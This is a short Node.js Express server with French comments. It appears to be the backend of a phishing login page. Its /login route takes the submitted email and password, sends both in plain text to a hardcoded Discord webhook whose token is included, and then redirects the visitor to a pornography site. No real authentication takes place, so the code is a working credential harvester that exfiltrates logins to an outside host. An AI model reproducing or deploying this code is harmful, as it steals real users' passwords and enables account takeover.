const express = require('express');
const axios = require('axios');  // Installez axios via `npm install axios`
const path = require('path');

const app = express();

// Middleware pour parser le corps des requêtes
app.use(express.urlencoded({ extended: true }));

// Middleware pour servir des fichiers statiques depuis le dossier "public"
app.use(express.static(path.join(__dirname, 'public')));

// URL du webhook Discord (vérifiez que l'URL est correcte)
const discordWebhookUrl = 'https://discord.com/api/webhooks/1344328555252682842/Svtgvwph1VzuDBIqrczwXPaj2k23EgYlIznXK3q5sUEvGOiFNLM2-Tul7Pun_Xw-nBhn';

// Route pour le login
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    try {
        console.log(`✅ Utilisateur connecté : ${email}`);

        // Création du payload incluant l'email et le mot de passe
        const payload = {
            content: `Nouvel utilisateur connecté :\nEmail : ${email}\nMot de passe : ${password}`,
            username: 'Mon Bot'
        };

        // Envoi de la requête POST vers le webhook Discord
        await axios.post(discordWebhookUrl, payload);

        // Redirection après connexion (à adapter selon vos besoins)
        res.redirect('https://fr.pornhub.com/');
    } catch (err) {
        console.error('❌ Erreur lors de l\'envoi du message Discord :', err);
        res.status(500).send('Erreur serveur');
    }
});

// Démarrer le serveur sur le port 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Serveur actif sur le port ${PORT}`));
